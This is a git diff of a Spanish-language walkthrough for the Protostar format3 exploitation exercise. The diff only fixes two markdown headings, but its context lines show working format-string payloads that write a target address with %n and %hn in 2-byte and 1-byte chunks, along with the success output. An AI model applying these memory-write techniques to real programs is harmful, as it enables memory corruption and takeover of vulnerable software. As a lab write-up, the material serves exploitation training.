@@ -225,7 +225,7 @@ $1 = 16930112
 [user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08" + "%16930112x%12$n")' | ./format3 | tail -n1
 you have modified the target :)
 ```
-###Extra -> en vez de escribir los 4 bytes, escribimos de 2 en 2
+## Extra -> en vez de escribir los 4 bytes, escribimos de 2 en 2
 
 ```console
 [user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%12$hn" + "%13$hn")' | ./format3 ;echo 
@@ -257,7 +257,7 @@ you have modified the target :)
 [user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf6\x96\x04\x08\xf4\x96\x04\x08" + "%250x%12$hn" + "%21570x%13$hn")' | ./format3 | tail -n1
 you have modified the target :)
 ```
-###Extra -> en vez de escribir los 4 bytes, escribimos de 1 en 1
+## Extra -> en vez de escribir los 4 bytes, escribimos de 1 en 1
 
 Ahora como escribimos un byte por memoria, escribimos 4 memorias  (0x080496f4, f5, f6 y f7) Pero como no hay parejas de dos bytes que se cambien, pueden ir en el orden bueno
 
